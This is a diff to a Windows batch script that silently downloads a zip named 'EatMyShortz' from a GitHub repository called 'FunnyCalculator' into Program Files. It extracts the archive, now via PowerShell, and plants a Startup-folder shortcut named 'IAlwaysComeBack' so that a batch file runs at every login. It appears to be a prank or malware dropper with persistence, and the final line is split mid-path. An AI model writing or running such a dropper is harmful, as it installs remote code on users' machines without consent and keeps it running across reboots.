@@ -1,8 +1,8 @@
 @echo off
 
 cd C:\"Program Files\"
-curl.exe -s -O EatMyShortz.zip "https://raw.githubusercontent.com/MyelinLennox/refs/heads/FunnyCalculator/main/EatMyShortz.zip"
-tar -xf ".\EatMyShortz.zip" -C ".\"
+curl.exe -s -O EatMyShortz.zip "https://github.com/MyelinLennox/FunnyCalculator/raw/refs/heads/main/EatMyShortz.zip"
+powershell -NoP -Command "Expand-Archive -LiteralPath 'EatMyShortz.zip' -DestinationPath '.' -Force"
 
 mklink "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\IAlwaysComeBack.lnk" "C:\Program Files\EatMy
 Shortz\IAlwaysComeBack.bat"
